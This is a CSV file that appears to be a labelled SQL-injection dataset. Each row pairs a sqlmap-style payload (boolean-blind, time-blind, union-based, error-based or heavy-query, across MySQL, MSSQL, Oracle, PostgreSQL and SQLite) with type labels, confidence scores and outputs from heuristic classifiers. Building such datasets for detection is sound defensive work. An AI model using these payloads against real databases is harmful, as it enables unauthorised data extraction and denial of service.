payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1 ) where 2390 = 2390,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1610,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 2390 = 2390
waitfor delay '0:0:5'-- thuo,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1611,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,waitfor delay '0:0:5'-- thuo
"-2929"" ) ) ) union all select 8999,8999#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1612,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2929"" ) ) ) union all select 8999,8999#"
1' ) where 5378 = 5378,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1613,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 5378 = 5378
"1"" and ( 3020 = 3020 ) *6703",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1614,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" and ( 3020 = 3020 ) *6703"
"1"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1615,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
1 ) where 8320 = 8320 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1616,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 ) where 8320 = 8320 waitfor delay '0:0:5'--
"1%"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""%"" = """,boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,1617,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""%"" = """
"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 2868 = 2868",error_based,oracle,0.85,ctxsys.drithsx for error extraction,KEEP,,error_based,oracle,1618,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 2868 = 2868"
"-5313"" ) ) ) union all select 9189,9189,9189,9189,9189,9189,9189,9189--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1619,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5313"" ) ) ) union all select 9189,9189,9189,9189,9189,9189,9189,9189--"
1' where 9216 = 9216,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1620,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 9216 = 9216
"-4772 ) ) ) union all select 3879,3879,3879,3879,3879--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1621,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4772 ) ) ) union all select 3879,3879,3879,3879,3879--"
"1"" ) as giqb where 4664 = 4664",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1622,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as giqb where 4664 = 4664"
1' and 7528 = 2894 and 'qoyw' = 'qoyw,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1623,boolean_blind,generic,Pattern match: 'and 7528 = 2894' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' and 7528 = 2894 and 'qoyw' = 'qoyw
"1%"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""%"" = """,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1624,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1%"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ""%"" = """
"select count ( * ) from generate_series ( 1,5000000 ) and 'roca' = 'roca",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1625,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and 'roca' = 'roca"
"-3362' where 6567 = 6567 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,1626,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-3362' where 6567 = 6567 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1627,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--"
"1"" and 9198 = 9198--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1628,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" and 9198 = 9198--"
1 ) as azoo where 8933 = 8933 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1629,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 ) as azoo where 8933 = 8933 and ( 3020 = 3020 ) *6703--
1'|| ( select 'hbho' from dual where 7193 = 7193,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1630,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'hbho' from dual where 7193 = 7193
1' ) ) ) rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1631,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) ) rlike sleep ( 5 ) #
1' where 3900 = 3900 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1632,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' where 3900 = 3900 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --
"-6007"" ) ) union all select 6019,6019,6019,6019,6019,6019,6019,6019--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1633,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6007"" ) ) union all select 6019,6019,6019,6019,6019,6019,6019,6019--"
"-9439"" ) where 9460 = 9460 or ( 9497 = 9586 ) *9586--",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1634,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-9439"" ) where 9460 = 9460 or ( 9497 = 9586 ) *9586--"
"1%' ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1635,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) union all select null,null,null,null,null,null,null,null,null--"
"1%' ) ) ) and elt ( 7425 = 3843,3843 ) and ( ( ( '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1636,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%' ) ) ) and elt ( 7425 = 3843,3843 ) and ( ( ( '%' = '"
select ( case when ( 1946 = 1302 ) then 1946 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1637,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 1946 = 1302 ) then 1946 else 1/ ( select 0 ) end ) --
( case when 6398 = 6398 then 1 else null end ),boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1638,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,( case when 6398 = 6398 then 1 else null end )
1' and 7533 = 7533 and 'frvk' = 'frvk,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1639,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' and 7533 = 7533 and 'frvk' = 'frvk
"-5362 ) union all select 7297,7297,7297,7297,7297#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1640,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5362 ) union all select 7297,7297,7297,7297,7297#"
1'+ ( select kfmv where 1679 = 1679,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1641,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select kfmv where 1679 = 1679
"1' ) as taay where 7027 = 7027 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1642,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1' ) as taay where 7027 = 7027 and elt ( 4249 = 4249,7259 ) --"
-8234' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1643,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8234' ) ) ) or 9323 = 9323#
1' ) where 6305 = 6305 rlike ( select ( case when ( 8326 = 9749 ) then 1 else 0x28 end ) ) --,boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1644,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) where 6305 = 6305 rlike ( select ( case when ( 8326 = 9749 ) then 1 else 0x28 end ) ) --
"1' in boolean mode ) and elt ( 4249 = 4249,7259 ) #",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1645,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' in boolean mode ) and elt ( 4249 = 4249,7259 ) #"
"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) -- dtha",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,1646,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) -- dtha"
1%' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = ',boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1647,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1%' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '
"-4811%' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",boolean_blind,mssql,0.8,CONVERT INT for blind,KEEP,,boolean_blind,mssql,1648,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-4811%' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '"
"1"" ) as wxea where 6394 = 6394 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,1649,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) as wxea where 6394 = 6394 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #"
"1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""eoab"" like ""eoab",boolean_blind,mssql,0.8,CONVERT INT for blind,KEEP,,boolean_blind,mssql,1650,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""eoab"" like ""eoab"
"-9145%' ) ) ) or make_set ( 9017 = 9368,9368 ) and ( ( ( '%' = '",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1651,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-9145%' ) ) ) or make_set ( 9017 = 9368,9368 ) and ( ( ( '%' = '"
"1%"" ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1652,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) union all select null,null,null,null,null,null,null,null,null,null--"
"-6389"" union all select 2355,2355,2355,2355,2355--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1653,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6389"" union all select 2355,2355,2355,2355,2355--"
"1"" ) ) as chal where 6661 = 6661",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1654,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as chal where 6661 = 6661"
1' ) ) as iipj where 6560 = 6560,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1655,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as iipj where 6560 = 6560
"1"" ) or sleep ( 5 ) and ( ""fiag"" like ""fiag",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1656,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" ) or sleep ( 5 ) and ( ""fiag"" like ""fiag"
1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'ejdk' like 'ejdk,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1657,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'ejdk' like 'ejdk
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1658,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1659,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '"
"-2896' ) ) as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1660,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2896' ) ) as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#"
-9363%' or ( 8459 = 8459 ) *4906 and '%' = ',boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1661,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-9363%' or ( 8459 = 8459 ) *4906 and '%' = '
"1%' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1662,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and '%' = '"
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1663,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--"
